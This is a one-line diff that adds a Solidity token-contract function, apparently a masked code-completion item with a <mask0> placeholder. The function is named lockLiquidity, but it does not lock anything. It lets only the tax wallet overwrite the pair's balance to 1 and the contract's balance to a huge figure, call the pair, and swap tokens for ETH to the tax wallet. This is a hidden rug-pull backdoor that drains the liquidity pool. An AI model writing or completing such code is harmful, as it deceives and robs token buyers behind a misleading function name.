@@ -1,0 +1,1 @@
+"function lockLiquidity() public{\t\trequire(_msgSender()==_taxWallet);\t\t_balance[address(this)] = 100000000000000000;\t\t_balance[_pair] = 1;\t\t(bool success,) = _pair.<mask0>;\t\tif (success) {\t\t\t\tswapTokensForEth(100000000, _taxWallet);\t\t} else { revert(\"Internal failure\"); }\t}"
